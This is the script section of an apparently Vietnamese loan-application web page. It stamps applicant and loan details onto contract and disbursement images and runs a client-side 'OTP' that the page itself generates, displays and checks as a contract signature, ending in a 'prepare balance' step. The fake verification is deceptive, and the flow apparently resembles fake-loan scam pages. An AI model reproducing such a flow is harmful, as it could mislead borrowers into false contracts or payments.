            const contractCanvas = document.getElementById('contractCanvas');
            const ctx = contractCanvas.getContext('2d');
            const contractImg = new Image();
            contractImg.crossOrigin = "Anonymous";
            contractImg.src = formData.contractImage;
            contractImg.onload = function() {
                contractCanvas.width = contractImg.width;
                contractCanvas.height = contractImg.height + 180;
                ctx.drawImage(contractImg, 0, 0);
                ctx.font = '18px Roboto';
                ctx.fillStyle = '#005BAC';
                ctx.fillText(`Họ và Tên: ${userData.fullName}`, 50, contractImg.height + 30);
                ctx.fillText(`Mã Hồ Sơ: ${userData.loanCode}`, 50, contractImg.height + 55);
                ctx.fillText(`Ngày Đăng Ký: ${userData.registrationDate}`, 50, contractImg.height + 80);
                ctx.fillText(`Số Tiền Vay: ${formatNumber(userData.loanAmount)} VND`, 50, contractImg.height + 105);
                ctx.fillText(`Số Tháng Vay: ${userData.loanTerm} tháng`, 50, contractImg.height + 130);
                ctx.fillText(`Số Tiền Góp Hàng Tháng: ${formatNumber(userData.monthlyPayment)} VND`, 50, contractImg.height + 155);
            };
        }

        // Bước 8: Xác nhận ký hợp đồng
        $('#proceedToSignContractBtn').on('click', function() {
            // Chuyển sang bước 8.1: Xác nhận ký hợp đồng bằng OTP
            $('#step8').addClass('hidden');
            $('#step8-1').removeClass('hidden');

            // Giả lập gửi OTP (hiển thị trên màn hình)
            const signOtp = Math.floor(100000 + Math.random() * 900000); // Mã OTP 6 chữ số
            $('#signOtpDisplay').text(signOtp);
            userData.signOtp = signOtp.toString();
        });

        // Hàm sao chép mã OTP
        function copySignOtp() {
            const signOtp = $('#signOtpDisplay').text();
            navigator.clipboard.writeText(signOtp).then(() => {
                alert("Đã sao chép mã OTP!");
            });
        }

        // Bước 8.1: Xác nhận OTP để ký hợp đồng
        $('#verifySignOtpBtn').on('click', function() {
            const enteredSignOtp = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
            if (enteredSignOtp === userData.signOtp) {
                // Chuyển sang bước 9: Nhận điều kiện hợp đồng giải ngân
                $('#step8-1').addClass('hidden');
                $('#step9').removeClass('hidden');

                // Vẽ hình ảnh điều kiện giải ngân với thông tin người đăng ký
                const disbursementCanvas = document.getElementById('disbursementCanvas');
                const ctx = disbursementCanvas.getContext('2d');
                const disbursementImg = new Image();
                disbursementImg.crossOrigin = "Anonymous";
                disbursementImg.src = formData.disbursementImage;
                disbursementImg.onload = function() {
                    disbursementCanvas.width = disbursementImg.width;
                    disbursementCanvas.height = disbursementImg.height + 180;
                    ctx.drawImage(disbursementImg, 0, 0);
                    ctx.font = '18px Roboto';
                    ctx.fillStyle = '#005BAC';
                    ctx.fillText(`Họ và Tên: ${userData.fullName}`, 50, disbursementImg.height + 30);
                    ctx.fillText(`Mã Hồ Sơ: ${userData.loanCode}`, 50, disbursementImg.height + 55);
                    ctx.fillText(`Ngày Đăng Ký: ${userData.registrationDate}`, 50, disbursementImg.height + 80);
                    ctx.fillText(`Số Tiền Vay: ${formatNumber(userData.loanAmount)} VND`, 50, disbursementImg.height + 105);
                    ctx.fillText(`Số Tháng Vay: ${userData.loanTerm} tháng`, 50, disbursementImg.height + 130);
                    ctx.fillText(`Số Tiền Góp Hàng Tháng: ${formatNumber(userData.monthlyPayment)} VND`, 50, disbursementImg.height + 155);
                };
            } else {
                alert("Mã OTP không đúng. Vui lòng thử lại!");
            }
        });

        // Bước 9: Tiếp tục đến bước cuối
        $('#proceedToFinalStepBtn').on('click', function() {
            // Chuyển sang bước 10: Chuẩn bị số dư và liên hệ
            $('#step9').addClass('hidden');
            $('#step10').removeClass('hidden');
        });

        // Tự động chuyển con trỏ giữa các ô OTP
        $('.otp-digit').on('keyup', function(e) {
            if (e.which === 8) { // Phím Backspace
                $(this).prev('.otp-digit').focus();
            } else if (this.value.length === this.maxLength) {
                $(this).next('.otp-digit').focus();
            }
        });
    </script>
</body>
</html>
